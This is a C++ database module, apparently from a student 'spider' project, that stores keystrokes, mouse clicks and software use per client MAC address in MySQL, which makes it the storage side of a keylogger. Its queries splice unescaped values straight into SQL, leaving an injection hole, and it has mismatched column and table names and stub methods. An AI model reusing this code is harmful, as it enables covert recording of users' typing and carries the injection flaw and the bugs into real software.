//
// Database.cpp for  in /home/bbr2394/renduTek3/cpp_spider/source
// 
// Made by Bertrand-Rapello Baptiste
// Login   <bertra_l@epitech.net>
// 
// Started on  Wed Oct 21 21:04:15 2015 Bertrand-Rapello Baptiste
// Last update Thu Nov  5 09:01:06 2015 Roussel Rodolphe
//

#include	"Database.hpp"

Database::Database(void) :
  m_db(mysql_init(NULL))
{
}

Database::~Database(void)
{
  mysql_close(m_db);
}

bool  Database::connect(std::string const &host, std::string const &port, std::string const &user, std::string const &passwd, std::string const &db)
{
  unsigned int portInt;

  portInt = std::stoul(port, nullptr, 10);
  std::cout << "le port est " << portInt << std::endl;
  if (mysql_real_connect(m_db, host.c_str(), user.c_str(), passwd.c_str(), db.c_str(), portInt, NULL, 0) == NULL)
    {
      std::cout << "je ne me suis pas co" << std::endl;
      if (mysql_real_connect(m_db, host.c_str(), user.c_str(), passwd.c_str(), NULL, portInt, NULL, 0) == NULL)
	{
	  std::cout << "il y a un pb" << std::endl;
	  return true;
	}
      select_db(db);
    }
  return false;
}

bool Database::select_db(std::string const & db)
{
  // MYSQL_RES *res;
  // MYSQL_FIELD *field;
  // MYSQL_ROW row;
  int rtr = 0;
  // int ret = 0;
  // unsigned int nbFields = 0;
  // unsigned long long nbRows = 0;
  std::string cmd;
  // std::string rtrBis;
  
  cmd = "CREATE DATABASE ";
  rtr = mysql_select_db(m_db, db.c_str());
  if (rtr != 0)
    {
      std::cout << "il faut créer la bdd" << std::endl;
      cmd += db;
      rtr = mysql_query(m_db, cmd.c_str());
      if (rtr != 0)
	return true;
      else
	{
	  rtr = mysql_select_db(m_db, db.c_str());
	  cmd = "CREATE TABLE client (id int, mac_address VARCHAR(18));";
	  rtr = mysql_query(m_db, cmd.c_str());
	  cmd = "CREATE TABLE keyboard_input (id_client INT, day DATE, hours TIME, id_key INT , state TEXT, id_process int);";
	  rtr = mysql_query(m_db, cmd.c_str());
	  cmd = "CREATE TABLE keyboard_mouse (id_client INT, day DATE, hours TIME, id_button INT, state TEXT, id_process int);";
	  rtr = mysql_query(m_db, cmd.c_str());
	  cmd = "CREATE TABLE log_input (id INT, log TEXT);";
	  rtr = mysql_query(m_db, cmd.c_str());
	  cmd = "CREATE TABLE key_string (id INT, id_key TEXT);";
	  rtr = mysql_query(m_db, cmd.c_str());
	  cmd = "CREATE TABLE mouse_string (id INT, button TEXT);";
	  rtr = mysql_query(m_db, cmd.c_str());
	  cmd = "CREATE TABLE software_used (id INT, soft_name TEXT);";
	  rtr = mysql_query(m_db, cmd.c_str());	  
	}
    }
  return false;
}

void		Database::check_into_database(MYSQL_RES *res, std::string &cmd, const std::string &data)
{
  MYSQL_ROW	row = NULL;
  unsigned int	nbFields = mysql_num_fields(res);
  std::string	line = "";
  int		lastid = 0;
  unsigned int	i;
  bool		stop = false;

  while ((row = mysql_fetch_row(res)) != NULL && stop != true)
    {
      //lengths = mysql_fetch_lengths(res);
      for (i = 0; i < nbFields; i+=2)
	{
	  lastid = std::stoi(row[i]);
	  line = row[i + 1];
	  if (line == data)
	    {
	      cmd += row[i];
	      stop = 1;
	    }
	}
    }
  if (stop != true)
    {
      /* le client n'existe pas je le rajoute */
      std::string toAdd = "INSERT INTO client (id, mac_addr) VALUES (";
      toAdd += std::to_string(lastid + 1);
      toAdd += ", \"" + data + "\");";
      mysql_query(m_db, toAdd.c_str());
      cmd += std::to_string(lastid + 1);
    }
}

bool Database::insert_keyboard(const std::string  & mac_address, const ITime  & tme, std::string event, const std::string & key, const std::string & process)
{
  std::string cmd = "INSERT INTO keyboard_input (id_client, day, hours, id_key, state, id_process) VALUES (";
  std::string clientName = "";
  std::string keyb_name = "";
  std::string soft_name = "";
  MYSQL_RES *res = NULL;
  // int rtr = 0;
  // int ret = 0;

  /* d abord je parcour les clients */
  mysql_query(m_db, "SELECT * FROM client"); 
  res = mysql_store_result(m_db);
  check_into_database(res, cmd, mac_address);

  /* ici on va s occuper de la date */

  /* pour le moment c'est a Null */
  std::cout << cmd << std::endl;
  cmd += ", NULL, NULL, ";

  /* ici on va parcourir les id des touches */
  mysql_query(m_db, "SELECT * FROM key_string_bis");
  res = mysql_store_result(m_db);
  check_into_database(res, cmd, key);
  cmd += ", \"" + event + "\", ";

  /* et maintenant de l'application */
  mysql_query(m_db, "SELECT * FROM software_used");
  res = mysql_store_result(m_db);
  check_into_database(res, cmd, soft_name);

  cmd += ");";
  std::cout << cmd << std::endl;
  mysql_query(m_db, cmd.c_str());
  
  //cmd = "INSERT INTO keyboard_inputbis (id_client\"";
  return false;
}

bool Database::insert_mouse(const std::string & mac_addresse, const ITime & tme, std::string event, const std::string & button, const std::string & process)
{
  return false;
}

bool Database::insert_log(const std::string & mac_addresse, const std::string & log)
{
  return false;
}

bool Database::show(const std::string & mac_addresse)
{
  return false;
}

IDatabase	&new_idatabase(void)
{
  return (*new Database());
}
